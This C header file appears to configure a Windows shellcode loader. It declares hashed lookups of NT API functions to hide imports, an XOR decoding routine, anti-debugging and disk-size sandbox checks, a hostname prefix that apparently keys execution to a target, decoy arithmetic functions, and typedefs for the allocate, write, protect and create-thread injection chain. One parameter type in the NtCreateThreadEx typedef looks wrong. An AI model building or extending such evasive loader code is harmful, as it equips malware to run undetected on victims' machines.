#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define HOSTNAME_PREFIX "CYCORP-"
#define DEBUG_MODE 1

#define TRUE 1
#define FALSE 0

#define NTDLL_HASH 0x69e00346   // ROL17

#define QUERY_INFORMATION_PROCESS_HASH 0x7091eca7 // ROR23
#define VIRTUAL_ALLOC_HASH 0x96124679 // ROR23 NtAllocateVirtualMemory
#define WRITE_MEMORY_HASH 0x92136911 // ROR23
#define VIRTUAL_PROTECT_HASH 0xd62f6483 // ROR23
#define CREATE_THREAD_HASH 0xdd007761 // ROR23
#define WAIT_FOR_SINGLE_OBJECT_HASH 0xde23aac9 // ROR23

void XOR(unsigned char *data, size_t len, WORD key);

HMODULE CustomGetModuleHandle(unsigned int module_hash);
FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash);

BYTE is_being_debugged();
// BYTE is_being_debugged_alternative();
// int d();
int get_disk_size();
// char* h();
// char* c();

int divide(int a, int b);
int multiply(int a, int b);
int add(int a, int b);
int substract(int a, int b);

typedef NTSTATUS (NTAPI* NtAllocVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* NtWriteVirtMem)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* NtProtectVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCRYPT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* NtWaitForSingleObj)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

#endif // CONFIG_H
